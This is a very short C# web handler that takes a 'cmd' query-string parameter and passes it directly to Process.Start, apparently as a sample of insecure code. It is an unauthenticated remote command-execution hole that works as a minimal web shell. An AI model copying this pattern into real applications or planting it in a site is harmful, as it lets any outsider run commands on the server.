public void Handle(HttpRequest request) {
    var cmd = Request.QueryString["cmd"];
    Process.Start(cmd);
}
